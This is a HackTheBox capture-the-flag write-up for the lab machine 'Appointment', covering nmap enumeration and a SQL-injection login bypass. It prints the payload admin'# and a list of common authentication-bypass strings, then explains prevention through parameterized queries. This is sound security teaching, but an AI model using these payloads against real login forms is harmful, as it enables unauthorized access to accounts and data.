# Appointment — HackTheBox Starting Point

**Machine:** Appointment
**Difficulty:** Very Easy
**OS:** Linux
**Category:** Starting Point
**Pwned:** 27 Jul 2026
**XP Earned:** 150

---

## Summary

Appointment introduces SQL injection authentication bypass. Nmap reveals Apache httpd 2.4.38 running on port 80. Navigating to the web application presents a login form that is vulnerable to SQL injection — submitting a payload that uses the MySQL comment character (`#`) bypasses authentication entirely and reveals the flag on the dashboard page. This maps directly to OWASP A03:2021 — Injection.

---

## Methodology

### 1. VPN Connection

```bash
sudo openvpn starting_point.ovpn
```

### 2. Host Discovery

```bash
ping -c 4 <target IP>
```

Target responded — host is alive.

### 3. Enumeration — Nmap Scan

```bash
sudo nmap -sV <target IP>
```

**Relevant output:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

**Findings:**

- Port 80 — HTTP open
- Service: Apache httpd 2.4.38 on Debian Linux
- Web application running — navigate to it in the browser

### 4. Web Application Enumeration

Navigated to `http://<target IP>` in the browser. A login form was presented requiring a username and password.

Attempted default credentials — no access.

### 5. Exploitation — SQL Injection Authentication Bypass

The login form passes user input directly into a SQL query without sanitization. The backend query likely looks like:

```sql
SELECT * FROM users WHERE username='<input>' AND password='<input>';
```

If user input is not handled carefully, it can be interpreted as SQL code rather than data.

**The payload:**

```
Username: admin'#
Password: (anything)
```

**How it works:**

The single quote (`'`) closes the username string. The hash (`#`) is the MySQL comment character — it comments out everything after it, including the `AND password=''` condition.

The query becomes:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything';
```

Which MySQL interprets as:

```sql
SELECT * FROM users WHERE username='admin'
```

The password check is completely removed. If a user named `admin` exists, login succeeds regardless of the password provided.

**Result:** Login bypassed — dashboard page loaded with the flag displayed.

**Flag:** `<flag value>`

---

## Vulnerability Summary

| Vulnerability                         | Severity | OWASP Classification                 |
| ------------------------------------- | -------- | ------------------------------------ |
| SQL Injection — Authentication Bypass | Critical | A03:2021 — Injection                 |
| No input validation on login form     | Critical | A03:2021 — Injection                 |
| Verbose error messages                | Low      | A05:2021 — Security Misconfiguration |

---

## SQL Injection — How It Works

**SQL (Structured Query Language)** is the language used to query and manipulate relational databases. Web applications use SQL queries to authenticate users, retrieve data, and perform operations.

**SQL injection** occurs when user-supplied input is incorporated directly into a SQL query without proper sanitization or parameterization. The attacker's input is interpreted as SQL code rather than data.

### Common MySQL Comment Characters

| Character | Usage                                                  |
| --------- | ------------------------------------------------------ |
| `#`       | Single-line comment — comments out everything after it |
| `--`      | Single-line comment (note the space after `--`)        |
| `/* */`   | Multi-line comment                                     |

### Common Authentication Bypass Payloads

```
admin'#
admin'--
' OR '1'='1
' OR 1=1--
admin' OR '1'='1'#
```

### Prevention

**Parameterized queries (prepared statements)** — the correct fix. The query structure is defined separately from the data, so user input can never be interpreted as SQL:

```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Secure — parameterized
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

**Input validation** — validate that input matches expected format before using it.

**WAF (Web Application Firewall)** — can detect and block common SQL injection patterns, but is not a substitute for fixing the underlying code.

---

## Key Lessons

- **SQL injection is still the most common and impactful web vulnerability** — it sits at A03 in the OWASP Top 10 for good reason
- **The `#` character is MySQL's comment operator** — using it in a username field comments out the password check entirely
- **Never trust user input** — any data coming from the browser must be treated as untrusted and never concatenated directly into SQL queries
- **Parameterized queries are the fix** — they separate SQL structure from data, making injection impossible regardless of what the user submits
- **Authentication bypass via SQL injection requires zero credentials** — an attacker does not need to know any valid username or password

---

## Tools Used

| Tool    | Purpose                                  |
| ------- | ---------------------------------------- |
| OpenVPN | VPN connection to HTB network            |
| ping    | Host discovery                           |
| Nmap    | Port scanning and service detection      |
| Browser | Web application access and SQL injection |

---

_HackTheBox Starting Point — Appointment | Pwned 27 Jul 2026_
